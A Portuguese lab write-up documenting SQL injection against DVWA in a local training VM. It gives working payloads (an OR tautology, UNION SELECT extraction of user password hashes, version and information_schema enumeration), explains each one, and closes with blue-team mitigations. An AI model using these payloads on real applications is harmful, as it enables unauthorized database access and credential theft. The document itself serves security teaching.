# Ataque 07 — SQL Injection no DVWA

![Categoria](https://img.shields.io/badge/categoria-web-red?style=flat-square)
![Ferramenta](https://img.shields.io/badge/ferramenta-Browser-blue?style=flat-square)
![Alvo](https://img.shields.io/badge/alvo-DVWA%20%2F%20Metasploitable%202-orange?style=flat-square)
![Resultado](https://img.shields.io/badge/resultado-dados%20extraídos-brightgreen?style=flat-square)

## Objetivo

Explorar a vulnerabilidade de SQL Injection na aplicação DVWA
(Damn Vulnerable Web App) para extrair utilizadores, passwords
e estrutura da base de dados sem autorização.

## O que é SQL Injection?

SQL Injection é uma das vulnerabilidades web mais perigosas e
mais comuns do mundo — está consistentemente no top 3 do OWASP.

Acontece quando uma aplicação web passa input do utilizador
diretamente para uma query SQL sem validação. Um atacante pode
injetar código SQL próprio e manipular as queries da base de dados.

Com SQL Injection bem explorada é possível:
- Aceder a todos os utilizadores e passwords da base de dados
- Saber a que bases de dados estão ligados os serviços
- Mapear toda a estrutura do servidor de base de dados
- Em casos extremos, executar comandos no servidor

Se a base de dados não estiver bem protegida e o código não
validar o input, os danos podem ser devastadores.

## Acesso ao DVWA

1. Abrir Firefox no Kali → `http://10.0.2.4`
2. Clicar em **DVWA**
3. Login: `admin` / `password` *(credenciais descobertas via MySQL)*
4. **DVWA Security** → mudar para **Low**
5. Clicar em **SQL Injection**

## Payloads Utilizados

### 1. Teste inicial — comportamento normal
```
1
```
Resultado: mostra o utilizador com ID 1 (admin/admin)

---

### 2. Primeiro SQL Injection — extrair todos os utilizadores
```
1' OR '1'='1
```

**Como funciona:** A plica `'` fecha a string da query original.
O `OR '1'='1'` é sempre verdadeiro — a base de dados devolve
todos os registos em vez de apenas o ID 1.

Resultado: todos os utilizadores expostos:
- admin / admin
- Gordon / Brown
- Hack / Me
- Pablo / Picasso
- Bob / Smith

---

### 3. UNION SELECT — extrair passwords
```
1' UNION SELECT user, password FROM users#
```

**Como funciona:** O UNION junta o resultado da query original
com uma segunda query completamente diferente. O `#` comenta
o resto da query original para não dar erro.

Resultado: hashes MD5 de todos os utilizadores expostos.

---

### 4. Enumerar base de dados e versão
```
1' UNION SELECT version(), database()#
```

Resultado: versão do MySQL e nome da base de dados (`dvwa`)

---

### 5. Mapear estrutura completa
```
1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database()#
```

**Como funciona:** O `information_schema` é uma base de dados
especial do MySQL com metadados sobre toda a estrutura do servidor.

Resultado: tabelas descobertas:
- `users` — utilizadores e passwords
- `guestbook` — livro de visitas
- `admin` — configurações de administrador

## Impacto

Esta vulnerabilidade permitiu, sem qualquer autenticação especial:
- Extrair todos os utilizadores e passwords da aplicação
- Descobrir a versão do servidor de base de dados
- Mapear todas as tabelas existentes
- Potencialmente aceder a outras bases de dados no servidor

## Mitigação (Perspetiva Blue Team)

- **Prepared statements** — nunca concatenar input do utilizador
  diretamente em queries SQL
- **Validação de input** — rejeitar caracteres especiais como `'`, `--`, `#`
- **Princípio do menor privilégio** — o utilizador da base de dados
  da aplicação só deve ter acesso ao estritamente necessário
- **WAF (Web Application Firewall)** — detetar e bloquear payloads
  de SQL Injection
- **Não expor erros** — mensagens de erro detalhadas ajudam o atacante
  a perceber a estrutura da base de dados
